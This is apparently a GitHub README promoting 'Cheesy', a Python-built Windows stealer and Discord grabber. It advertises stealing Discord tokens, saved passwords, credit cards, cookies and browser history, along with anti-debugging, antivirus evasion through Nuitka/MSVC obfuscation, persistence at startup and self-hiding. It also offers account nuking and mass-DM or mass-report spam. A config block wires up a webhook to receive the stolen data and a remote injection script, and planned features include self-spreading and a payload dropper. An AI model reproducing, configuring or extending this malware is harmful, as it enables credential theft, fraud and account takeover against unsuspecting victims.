<h1 align="center">
  Cheesy Remastered
</h1>

<p align="center"> 
  <kbd>
<img src="https://cdn.kkgmedia.com/pop-cat.gif">
  </kbd>
</p>

<p align="center">
  <img src="https://img.shields.io/github/last-commit/bananaman2020/cheesy?style=flat-square">
  <img src="https://sonarcloud.io/api/project_badges/measure?project=bananaman2020_cheesy&metric=ncloc"/>
</p>

<h2 align="center">
 Cheesy was made with

K78 ❌ tesco ✅

</h2>

<h2 align="center">
⚠️BIG NEWS:⚠️
I've just released the biggest update ever. V3 is officialy [LIVE](https://github.com/bananaman2020/cheesy/releases/tag/3.0.0) 🎉
</h2>

**NOTE:** \
Cheesy was made for educational purposes, therefore all consequences caused by your actions are **your** responsibility and accountability.


---

## <a id="content"></a>🌐 〢 Content

- [🔰・Features](#features)
- [🌌・Discord](https://discord.gg/ys8WBY8VEQ)
- [🎉・Setting up Cheesy](#setup)
- [⚙・Config](#config)
- [🐢・Why is it slower?](#slow)
- [🤔・How does the compiler work?](#how_compiler)
- [🔎・Why choose Cheesy?](#why_cheese)
- [🌟・Todo/Enhancements](#enhancements)
- [📝・Changelog](#changelog)

## <a id="features"></a>🔰 〢 Features

```
> Anti-vm/Anti-debug
> Improved upon Rdimo's project and added Obfuscation using MSVC
> Add to startup
> Hides itself
> Supports a webhook protector but the old one got removed off github (looking for a replacement, suggestions welcome in the issues tab)
> Options are configurable
> Pretty Fast Even if it Was Made With Python
> Windows Product Key & Build Info
> IP & Geolocation. (Country, City, Google Maps Location)
> A screenshot of all their monitors
> All valid/working discord tokens. (Bypasses BetterDiscord, Token Protector and Discord's new encryption)
> Their Passwords & Credit Cards for Discord (updates when they change it)
> All Passwords, Cookies and History from Google
> Settings (Change the Color Theme, Thread Amount, Hotkeys and more!)
> Both Compact and Feature-Rich
> QoL Features such as Auto-Update, proxy scraping and more!
> Easy to use!
> Fast and Efficient (Low Performance Impact)
> Linux Support! (Expect Bugs)
> Create a token logger or QR code stealer! (QR Code Stealer temporarily broken)
> Nuke an account!
> Change an accounts Status, Bio, or HypeSquad house!
> Mass DM using an account!
> Log into an account with an isolated browser!
> Mass Report a user or server!
> Group Chat Spam!
> Webhook Nuker/Deleter
> + More!
```

---

## <a id="setup"></a> 📁 〢 Setting up Cheesy

1. Install [python](https://www.python.org/) and add it to [path](https://datatofish.com/add-python-to-windows-path/).
2. Download Visual Studio Community 2022 and get the C++ Development Feature Pack during the installer screen
3. Open up [setup.bat](https://github.com/bananaman2020/cheesy/blob/master/setup.bat) and it will automatically install dependencies etc.
4. A Window will open with the main GUI. First it will check for updates. If there is one Press Y and it will automatically download.

## <a id="config"></a>⚙ 〢 Config

If you want to change the config, open up [main.py](https://github.com/bananaman2020/cheesy/blob/master/assets/main.py) and locate it at the top. There you can configure the following:

```py
config = {
    "webhook": "WEBHOOK_HERE",  # Place your webhook here (don't touch this)
    "webhook_protector_key": "KEY_HERE",
    # keep it as it is unless you want to have a custom one
    "injection_url": "https://raw.githubusercontent.com/bananaman2020/Discord-Injection/master/injection.js",
    # if True, it will ping @everyone when someone ran Cheesy v3
    "ping_on_run": False,
    # set to False if you don't want it to kill programs such as discord upon running the exe
    "kill_processes": True,
    # if you want the file to run at startup
    "startup": True,
    # if you want the file to hide itself after run
    "hide_self": True,
    # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
    "anti_debug": True,
    # this list of programs will be killed if cheesy detects that any of these are running, you can add more if you want
    'blackListedPrograms':
    [
      ...
    ]

}
```

---
## <a id="slow"></a>🐢 〢 Why is it slower to compile now?

well as the new compiler is "Nuitka" it pretty much works by translating python into C++ which is a lengthy process though during my testing on a i7-10700k compiling takes around 5-10minutes

This improves security by a lot. The reason I chose Nuitka is because (A) it's free (B) It obfuscates pretty well

The only con to this is that dropping the file into virustotal or interzer analyze will display a flag that shows "Probably Packed (Suspicious)" This is because Nuitka's unpacker that's in the exe leaves a few traces to the obfuscation method. This is out of my control as it is simply way too complicated to change but for 99.9% of people this won't be an issue.

**UPDATE**
I changed the requirement to be MSVC as it is faster and gets rid of the "Probably Packed (Suspicious) flag on AVs

## <a id="how_compiler"></a>🤔 〢 How does the compiler work?

Nuitka is the main packer. It then passes the pack to MSVC to compile it in C++ which is faster and less likely to get detected.

## <a id="why_cheese"></a>🔎 〢 Why choose Cheesy?

idk i did this so like piss off egirls and shit

Here are some pros and cons why/why not use Cheesy instead of other ones

### ✔ Pros

⁃ Extremely well maintained, making it a safe choice \
⁃ Partly undetected just because it gets updates often \
⁃ Easy to use and setup \
⁃ Completely free and open source \
⁃ Loads of wide spread features not only focused on discord \
⁃ Cleans itself up, deleting all traces of itself which suprisingly most others don't \
⁃ Supports a webhook protector \
⁃ Even thought it's made in python it's very fast thanks to async and threading \
⁃ Clean embed & isn't spammy like others making it less likely to get ratelimited \
⁃ Takes feedback and listens to what people want to be added/changed/removed

### ❌ Cons

⁃ Made in Python making it lose to other grabbers in terms of speed \
⁃ Python is an interpreted language, it needs to pack the engine & all dependencies making the file size very big \
⁃ Only supports windows 10/11 \
⁃ Can be pretty easily decompiled (still harder than Mercurial atleast)

In the end it's just up to **you** to choose what grabber suits you and your needs the best.

---

## <a id="enhancements"></a>🌟 〢 todo/enhancements

~~overlined~~ = feature got added

- Grab Webcam (screenshot?, video?) 
- Fake Error (custom message, type, etc...)
- File dropper (direct payload link, options: hide it? add to startup? drop location?)
- Self spread 
- Grab Wifi passwords 
- Better Anti-vm/Anti-debug (check screen size?, more registery checks?, make the lists outbound?)
- Fix QR Code Generator
- ~~Exe builder (clean gui, toggable options, compress exe (file size <= 8mb), etc...)~~
- ~~Grab Chrome history~~
- ~~Grab Minecraft accessToken~~
- ~~Grab hwid (for manual blacklisting)~~
- ~~Grab more network info (ip, geolocation, etc...) and put in seperate txt file~~
- ~~General info (OS, CPU, GPU, RAM, etc...) and put in seperate txt file~~
- ~~Add Nuker~~
- ~~Mass DM~~
- ~~Improve Speed~~

Not adding/on hold:
- .doc/.pdf file grabbing 
- Metamask Priv Key and seed 

---

## <a id="changelog"></a>💭 〢 ChangeLog

```diff
v3.0.0 : 09-03-2024 (Massive Update, so massive that I skipped V2 entirely)
+ Back from the dead (real talk sorry for being gone so long.)
+ Added GUI
+ Cleaned up Code
+ Nuker
+ DM Deleter
+ Blocker
+ Mass DM + Report
+ Server Spam + Leave
+ Webhook Killer
+ Profile Changer
- Broke QR Code Generator
v1.0.5 : 04-12-2022
+ Early Merry Christmas
+ Updated Readme
+ Cleaned up code
- Lost Webhook Protector

v1.0.4 : 24-08-2022
+ Updated EXE Builder to use MSVC (new requirement)
+ Better hidden because of Microsoft's C++ Compiler. Less likely to trigger "Suspicious: Python Packed"

v1.0.3 : 13-08-2022
+ Visual Studio Code added as blacklisted software
+ Injection changed to be more persistent 
- Minor Update

v1.0.2 : 01-08-2022
+ updated exe builder to play nicely with nuitka
- im losing my sanity

v1.0.1 : 01-08-2022
+ nvm fuck pyarmor
+ i love nuitka (new obfuscator)
- pyarmor got fucked in the ass haha L not paying for ur shit

v1.0.0 : 31-07-2022
+ Lost the old source code so rebuilt based off Hazard
+ Will include pyarmor to obfuscate code
```


<br>

<p align="center">
🌟 <b>Enjoyed Cheesy?</b> Consider dropping a star :)
<br>
Upgraded by bananaman2020 based off Rdimo
<br>
<a href=#top>Back to Top</a></p>
